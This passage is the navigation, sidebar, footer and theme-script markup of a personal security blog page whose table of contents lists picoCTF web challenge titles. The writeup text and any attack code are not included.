toc-level-1"><a class="toc-link" href="#unminify"><span class="toc-number">2.</span> <span class="toc-text">unminify</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Includes"><span class="toc-number">3.</span> <span class="toc-text">Includes</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#picobrowser"><span class="toc-number">4.</span> <span class="toc-text">picobrowser</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQLiLite"><span class="toc-number">5.</span> <span class="toc-text">SQLiLite</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#More-SQLi"><span class="toc-number">6.</span> <span class="toc-text">More SQLi</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Trickster"><span class="toc-number">7.</span> <span class="toc-text">Trickster</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Super-Serial"><span class="toc-number">8.</span> <span class="toc-text">Super Serial</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Java-Code-Analysis"><span class="toc-number">9.</span> <span class="toc-text">Java Code Analysis!?!</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#IntroToBurp"><span class="toc-number">10.</span> <span class="toc-text">IntroToBurp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Forbidden-Paths"><span class="toc-number">11.</span> <span class="toc-text">Forbidden Paths</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#It-is-my-Birthday"><span class="toc-number">12.</span> <span class="toc-text">It is my Birthday</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Irish-Name-Repo-1"><span class="toc-number">13.</span> <span class="toc-text">Irish-Name-Repo 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SOAP"><span class="toc-number">14.</span> <span class="toc-text">SOAP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-Direct"><span class="toc-number">15.</span> <span class="toc-text">SQL Direct</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Cookies"><span class="toc-number">16.</span> <span class="toc-text">Cookies</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#More-Cookies"><span class="toc-number">17.</span> <span class="toc-text">More Cookies</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Client-side-again"><span class="toc-number">18.</span> <span class="toc-text">Client-side-again</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Some-Assembly-Required-1"><span class="toc-number">19.</span> <span class="toc-text">Some Assembly Required 1</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/f9317c8b/" title="[HTB] Locked Away Writeup 🔒"><img src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/help-you-at-solving-hackthebox-htb-challenges-machines.png" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="[HTB] Locked Away Writeup 🔒"></a><div class="content"><a class="title" href="/posts/f9317c8b/" title="[HTB] Locked Away Writeup 🔒">[HTB] Locked Away Writeup 🔒</a><time datetime="2024-10-11T06:30:53.000Z" title="Created 2024-10-11 12:00:53">2024-10-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/e5109b78/" title="Intro to Fermat's Little Theorem"><img src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/fermatlittle.jpg" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="Intro to Fermat's Little Theorem"></a><div class="content"><a class="title" href="/posts/e5109b78/" title="Intro to Fermat's Little Theorem">Intro to Fermat's Little Theorem</a><time datetime="2024-10-08T13:02:24.000Z" title="Created 2024-10-08 18:32:24">2024-10-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/bd7b2870/" title="[HTB] CubeMadness1 Writeup"><img src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/help-you-at-solving-hackthebox-htb-challenges-machines.png" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="[HTB] CubeMadness1 Writeup"></a><div class="content"><a class="title" href="/posts/bd7b2870/" title="[HTB] CubeMadness1 Writeup">[HTB] CubeMadness1 Writeup</a><time datetime="2024-10-07T05:20:06.000Z" title="Created 2024-10-07 10:50:06">2024-10-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/517a12d7/" title="Intro to Extended Euclidean Algorithm"><img src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/24/9/euclidean_9fab94cfbbb8a5c35339bd17b312eeb9.jpg" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="Intro to Extended Euclidean Algorithm"></a><div class="content"><a class="title" href="/posts/517a12d7/" title="Intro to Extended Euclidean Algorithm">Intro to Extended Euclidean Algorithm</a><time datetime="2024-09-30T08:42:22.924Z" title="Created 2024-09-30 14:12:22">2024-09-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/ad637ee9/" title="一些關於明道辯論社的榮耀以及我的高中三年的時光碎片"><img src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/MD_Debate.jpg" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="一些關於明道辯論社的榮耀以及我的高中三年的時光碎片"></a><div class="content"><a class="title" href="/posts/ad637ee9/" title="一些關於明道辯論社的榮耀以及我的高中三年的時光碎片">一些關於明道辯論社的榮耀以及我的高中三年的時光碎片</a><time datetime="2024-09-23T18:15:29.000Z" title="Created 2024-09-23 23:45:29">2024-09-23</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div id="footer_deal"><a class="deal_link" target="_blank" rel="noopener" href="https://github.com/S1l3ntC0nquer" title="GitHub"><i class="fa-brands fa-github"></i></a><a class="deal_link" target="_blank" rel="noopener" href="https://www.facebook.com/profile.php?id=" title="Facebook"><i class="fa-brands fa-facebook"></i></a><a class="deal_link" href="mailto:S1l3ntC0nquer@gmail.com" title="Email"><i class="fa-solid fa-envelope"></i></a><img class="footer_mini_logo" title="Back to top" alt="Back to top" onclick="anzhiyu.scrollToDest(0,500)" src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/assets/me.jpg" size="50px"><a class="deal_link" target="_blank" rel="noopener" href="https://www.linkedin.com/in/%E5%AD%90%E9%9B%8B-%E9%99%B3-11087825b/" title="LinkedIn"><i class="fa-brands fa-linkedin-in"></i></a><a class="deal_link" target="_blank" rel="noopener" href="https://discord.com/users/" title="Discord"><i class="fa-brands fa-discord"></i></a><a class="deal_link" target="_blank" rel="noopener" href="https://x.com/S1l3ntC0nquer" title="X"><i class="fa-brands fa-x-twitter"></i></a></div><div id="anzhiyu-footer"><div class="footer-group"><div class="footer-title">Articles</div><div class="footer-links"><a class="footer-item" title="Archives" href="/archives/">Archives</a><a class="footer-item" title="Categories" href="/categories/">Categories</a><a class="footer-item" title="Tags" href="/tags/">Tags</a></div></div><div class="footer-group"><div class="footer-title">Social center</div><div class="footer-links"><a class="footer-item" title="Sites" href="/link/">Sites</a><a class="footer-item" title="Message board" href="/comments/">Message board</a></div></div><div class="footer-group"><div class="footer-title">My</div><div class="footer-links"><a class="footer-item" title="Music bar" href="/music/?id=12295857597&amp;server=netease">Music bar</a><a class="footer-item" title="Talks" href="/essay/">Talks</a><a class="footer-item" title="Books" href="/notyet/">Books</a><a class="footer-item" title="Photos" href="/album/">Photos</a></div></div><div class="footer-group"><div class="footer-title">About</div><div class="footer-links"><a class="footer-item" title="Whoami" href="/about/">Whoami</a><a class="footer-item" title="Subscribe" href="/subscribe/">Subscribe</a><a class="footer-item" title="Portfolio" target="_blank" rel="noopener" href="https://S1l3ntC0nquer.in/">Portfolio</a><a class="footer-item" title="Support me" target="_blank" rel="noopener" href="https://buymeacoffee.com/S1l3ntC0nquer">Support me</a></div></div><div class="footer-group"><div class="footer-title-group"><div class="footer-title">Link exchange</div><a class="random-friends-btn" id="footer-random-friends-btn" href="javascript:addFriendLinksInFooter();" title="Shuffle Links"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right"></i></a></div><div class="footer-links" id="friend-links-in-footer"></div></div></div></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2024 By <a class="footer-bar-link" href="/" title="S1l3ntC0nquer" target="_blank">S1l3ntC0nquer</a></div></div><div id="footer-type-tips"></div><div class="js-pjax"><script>function subtitleType(){window.typed=new Typed("#footer-type-tips",{strings:["Yes, I am a criminal. My crime is that of curiosity","Join the dark side","Build the universe with me","Hack the planet!","Why? Because I can.","Why? Because it's there."],startDelay:300,typeSpeed:200,loop:!0,backSpeed:50})}"function"==typeof Typed?subtitleType():getScript("https://cdn.jsdelivr.net/npm/typed.js@2.1.0/dist/typed.umd.min.js").then(subtitleType)</script></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="Theme">Theme</a><a class="footer-bar-link cc" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-nd/4.0/deed.en" title="Copyright"><i class="anzhiyufont anzhiyu-icon-copyright-line"></i><i class="anzhiyufont anzhiyu-icon-creative-commons-by-line"></i><i class="anzhiyufont anzhiyu-icon-creative-commons-nc-line"></i><i class="anzhiyufont anzhiyu-icon-creative-commons-nd-line"></i></a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">Articles</div><div class="length-num">67</div></a><a href="/tags/" title="tag"><div class="headline">Tags</div><div class="length-num">38</div></a><a href="/categories/" title="category"><div class="headline">Categories</div><div class="length-num">10</div></a></div><span class="sidebar-menu-item-title">Function</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="Display Mode"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>Display Mode</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">Contact</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://x.com/S1l3ntC0nquer" title="X"><img class="back-menu-item-icon" src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/assets/x.png" alt="X"><span class="back-menu-item-text">X</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://www.facebook.com/profile.php?id=" title="Facebook"><img class="back-menu-item-icon" src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/assets/fb.png" alt="Facebook"><span class="back-menu-item-text">Facebook</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://www.linkedin.com/in/%E5%AD%90%E9%9B%8B-%E9%99%B3-11087825b/" title="LinkedIn"><img class="back-menu-item-icon" src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/assets/linkedin.png" alt="LinkedIn"><span class="back-menu-item-text">LinkedIn</span></a><a class="back-menu-item" href="/assets/Resume.pdf" title="Resume"><img class="back-menu-item-icon" src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/assets/me.jpg" alt="Resume"><span class="back-menu-item-text">Resume</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">Others</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://S1l3ntC0nquer.in" title="Portfolio"><img class="back-menu-item-icon" src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/assets/me.jpg" alt="Portfolio"><span class="back-menu-item-text">Portfolio</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://admin.S1l3ntC0nquer.in" title="Admin"><img class="back-menu-item-icon" src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/assets/hacker.png" alt="Admin"><span class="back-menu-item-text">Admin</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">Useful Tools</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://revshells.S1l3ntC0nquer.in" title="RevShells"><img class="back-menu-item-icon" src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/assets/hacker.png" alt="RevShells"><span class="back-menu-item-text">RevShells</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://ohmycv.S1l3ntC0nquer.in" title="OhMyCV"><img class="back-menu-item-icon" src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/assets/hacker.png" alt="OhMyCV"><span class="back-menu-item-text">OhMyCV</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://gtfobins.S1l3ntC0nquer.in" title="GTFOBins"><img class="back-menu-item-icon" src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/assets/hacker.png" alt="GTFOBins"><span class="back-menu-item-text">GTFOBins</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>Articles</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="fa-solid fa-file-zipper faa-tada"></i><span> Archives</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="fa-solid fa-icons faa-tada"></i><span> Categories</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="fa-solid fa-hashtag faa-tada"></i><span> Tags</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="fa-solid fa-dice faa-tada"></i><span> Random</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>My</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/assets/Resume.pdf"><i class="fa-solid fa-file faa-tada"></i><span> Resume</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="fa-solid fa-music faa-tada"></i><span> Music bar</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/collect/"><i class="fa-solid fa-medal faa-tada"></i><span> Collections</span></a></li><li><a class="site-page child faa-parent animated-hover" target="_blank" rel="noopener" href="https://S1l3ntC0nquer.notion.site/Bullet-Journal-c79ab73909d94fa387d4b58e85d90494"><i class="fa-solid fa-clipboard-list faa-tada"></i><span> Notes</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>About</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="fa-solid fa-id-badge faa-tada"></i><span> Whoami</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/subscribe/"><i class="fa-solid fa-bell faa-tada"></i><span> Subscribe</span></a></li><li><a class="site-page child faa-parent animated-hover" target="_blank" rel="noopener" href="https://S1l3ntC0nquer.in/"><i class="fa-solid fa-user faa-tada"></i><span> Portfolio</span></a></li></ul></div></div><span class="sidebar-menu-item-title">Tags</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/AI/" style="font-size:.88rem">AI<sup>1</sup></a><a href="/tags/AIS3/" style="font-size:.88rem">AIS3<sup>1</sup></a><a href="/tags/Assembly-Code/" style="font-size:.88rem">Assembly Code<sup>1</sup></a><a href="/tags/Blog/" style="font-size:.88rem">Blog<sup>1</sup></a><a href="/tags/Byte-Code/" style="font-size:.88rem">Byte Code<sup>1</sup></a><a href="/tags/CCEP/" style="font-size:.88rem">CCEP<sup>1</sup></a><a href="/tags/CRT/" style="font-size:.88rem">CRT<sup>1</sup></a><a href="/tags/CTF/" style="font-size:.88rem">CTF<sup>33</sup></a><a href="/tags/Crypto/" style="font-size:.88rem">Crypto<sup>7</sup></a><a href="/tags/Cryptography/" style="font-size:.88rem">Cryptography<sup>2</sup></a><a href="/tags/CyberSec/" style="font-size:.88rem">CyberSec<sup>29</sup></a><a href="/tags/GDSC/" style="font-size:.88rem">GDSC<sup>1</sup></a><a href="/tags/GamePwn/" style="font-size:.88rem">GamePwn<sup>1</sup></a><a href="/tags/HITCON/" style="font-size:.88rem">HITCON<sup>1</sup></a><a href="/tags/HTB/" style="font-size:.88rem">HTB<sup>14</sup></a><a href="/tags/HackTheBox/" style="font-size:.88rem">HackTheBox<sup>10</sup></a><a href="/tags/Hacker/" style="font-size:.88rem">Hacker<sup>1</sup></a><a href="/tags/Hacking/" style="font-size:.88rem">Hacking<sup>1</sup></a><a href="/tags/HacktTheBox/" style="font-size:.88rem">HacktTheBox<sup>1</sup></a><a href="/tags/Hardware/" style="font-size:.88rem">Hardware<sup>2</sup></a><a href="/tags/Machine-Code/" style="font-size:.88rem">Machine Code<sup>1</sup></a><a href="/tags/Math/" style="font-size:.88rem">Math<sup>2</sup></a><a href="/tags/Misc/" style="font-size:.88rem">Misc<sup>1</sup></a><a href="/tags/GTU/" style="font-size:.88rem">GTU<sup>1</sup></a><a href="/tags/PicoCTF/" style="font-size:.88rem">PicoCTF<sup>13</sup></a><a href="/tags/Pwn/" style="font-size:.88rem">Pwn<sup>15</sup></a><a href="/tags/Registers/" style="font-size:.88rem">Registers<sup>1</sup></a><a href="/tags/Reverse/" style="font-size:.88rem">Reverse<sup>1</sup></a><a href="/tags/SCIST/" style="font-size:.88rem">SCIST<sup>2</sup></a><a href="/tags/SQLi/" style="font-size:.88rem">SQLi<sup>1</sup></a><a href="/tags/Security/" style="font-size:.88rem">Security<sup>1</sup></a><a href="/tags/TechStreak30/" style="font-size:.88rem">TechStreak30<sup>9</sup></a><a href="/tags/Web/" style="font-size:.88rem">Web<sup>3</sup></a><a href="/tags/%E5%AF%86%E7%A2%BC%E5%AD%B8/" style="font-size:.88rem">Cryptography<sup>1</sup></a><a href="/tags/%E7%AD%86%E8%A8%98/" style="font-size:.88rem">Notes<sup>1</sup></a><a href="/tags/%E7%B6%B2%E9%A0%81%E9%96%8B%E7%99%BC/" style="font-size:.88rem">Web Development<sup>1</sup></a><a href="/tags/%E8%B3%87%E5%AE%89/" style="font-size:.88rem">Cybersecurity<sup>11</sup></a><a href="/tags/%E9%A7%AD%E5%AE%A2/" style="font-size:.88rem">Hacker<sup>1</sup></a></div></div><hr></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="Switch Between Traditional Gujarati And Simplified Gujarati">ૠ</button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll To Comments"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><a id="switch-commentBarrage" href="javascript:anzhiyu.switchCommentBarrage();" title="Bullet screen"><i class="anzhiyufont anzhiyu-icon-danmu"></i></a><button id="go-up" type="button" title="Back To Top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">Play music</a><div id="console-music-bg"></div><meting-js id="12295857597" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span> Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"></div></div><hr><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size:1rem"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>Copy</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>Paste</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>Quote it</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>New tab</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>Copy URL</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>Copy image</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>Downlaod</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>New tab</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>Site search</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>Google it</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>Play music</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>Prev track</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>Next track</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://music.163.com/playlist?id=7032963191&amp;userid=6279304773&quot;, &quot;_blank&quot;);" style="display:none"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>See playlist</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>Song name</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>Random post</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>Categories</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>Tags</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>Share</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">Bullet screen off</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">Light / Dark</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>Simp / Trad</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@5.2.0/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><script>function panguFn(){"object"==typeof pangu?pangu.autoSpacingPage():getScript("https://cdn.jsdelivr.net/npm/pangu@4.0.7/dist/browser/pangu.min.js").then(()=>{pangu.autoSpacingPage()})}function panguInit(){GLOBAL_CONFIG_SITE.isPost&&panguFn()}document.addEventListener("DOMContentLoaded",panguInit)</script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script async src="/anzhiyu/random.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/copy-tex.min.js"></script><script>document.querySelectorAll("#article-container span.katex-display").forEach(a=>{anzhiyu.wrap(a,"div",{class:"katex-wrap"})})</script><script>(()=>{const e=document.querySelectorAll("#article-container .mermaid-wrap");if(0===e.length)return;const t=()=>{window.loadMermaid=!0;const t="dark"===document.documentElement.getAttribute("data-theme")?"dark":"default";Array.from(e).forEach((e,n)=>{const d=e.firstElementChild,r="mermaid-"+n,a="%%{init:{ 'theme':'"+t+"'}}%%\n"+d.textContent,i=mermaid.render(r,a);var m;"string"==typeof i?(m=i,d.insertAdjacentHTML("afterend",m)):i.then(({svg:e})=>{d.insertAdjacentHTML("afterend",e)})})},n=()=>{window.loadMermaid?t():getScript("https://cdn.jsdelivr.net/npm/mermaid@10.2.4/dist/mermaid.min.js").then(t)};anzhiyu.addGlobalFn("themeChange",t,"mermaid"),window.pjax?n():document.addEventListener("DOMContentLoaded",n)})()</script><script>(()=>{const t=()=>{"object"==typeof twikoo?setTimeout(o,0):getScript("https://cdn.jsdelivr.net/npm/twikoo@1.6.36/dist/twikoo.all.min.js").then(o)},o=()=>{twikoo.init(Object.assign({el:"#twikoo-wrap",envId:"https://comments.S1l3ntC0nquer.in/",region:"",onCommentLoaded:()=>{anzhiyu.loadLightbox(document.querySelectorAll("#twikoo .tk-content img:not(.tk-owo-emotion)"))}},null)),GLOBAL_CONFIG_SITE.isPost&&(()=>{const t=document.getElementById("twikoo-count");t&&twikoo.getCommentsCount({envId:"https://comments.S1l3ntC0nquer.in/",region:"",urls:[window.location.pathname],includeReply:!1}).then(o=>{t.textContent=o[0].count}).catch(t=>{console.error(t)})})()};t()})()</script><input type="hidden" name="page-type" id="page-type" value="post"><script async src="/js/anzhiyu/comment_barrage.js"></script></div><script>window.addEventListener("load",()=>{const e=e=>{let t="";if(e.length)for(let n=0;n<e.length;n++){t+="<div class='aside-list-item'>";{const a="data-lazy-src";t+=`<a href='${e[n].url}' class='thumbnail'><img ${a}='${e[n].avatar}' alt='${e[n].nick}'><div class='name'><span>${e[n].nick} </span></div></a>`}t+=`<div class='content'>\n        <a class='comment' href='${e[n].url}' title='${e[n].content}'>${e[n].content}</a>\n        <time datetime="${e[n].date}">${anzhiyu.diffDate(e[n].date,!0)}</time></div>\n        </div>`}else t+="No Comment";let n=document.querySelector("#card-newest-comments .aside-list");n&&(n.innerHTML=t),window.lazyLoadInstance&&window.lazyLoadInstance.update(),window.pjax&&window.pjax.refresh(n)},t=()=>{if(document.querySelector("#card-newest-comments .aside-list")){const t=saveToLocal.get("twikoo-newest-comments");t?e(JSON.parse(t)):(()=>{const t=()=>{twikoo.getRecentComments({envId:"https://comments.S1l3ntC0nquer.in/",region:"",pageSize:6,includeReply:!0}).then((function(t){const n=t.map(e=>{return{content:(t=e.comment,""===t||(t=(t=(t=(t=t.replace(/<img.*?src="(.*?)"?[^\>]+>/gi,"[image]")).replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi,"[link]")).replace(/<pre><code>.*?<\/pre>/gi,"[code]")).replace(/<[^>]+>/g,"")).length>150&&(t=t.substring(0,150)+"..."),t),avatar:e.avatar,nick:e.nick,url:e.url+"#"+e.id,date:new Date(e.created).toISOString()};var t});saveToLocal.set("twikoo-newest-comments",JSON.stringify(n),10/1440),e(n)})).catch((function(e){document.querySelector("#card-newest-comments .aside-list").textContent="Unable to get the data, please make sure the settings are correct."}))};"object"==typeof twikoo?t():getScript("https://cdn.jsdelivr.net/npm/twikoo@1.6.36/dist/twikoo.all.min.js").then(t)})()}};t(),document.addEventListener("pjax:complete",t)})</script><script async data-pjax src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/npm/anzhiyu-theme-static@1.0.0/waterfall/waterfall.min.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.min.css"><link rel="stylesheet" 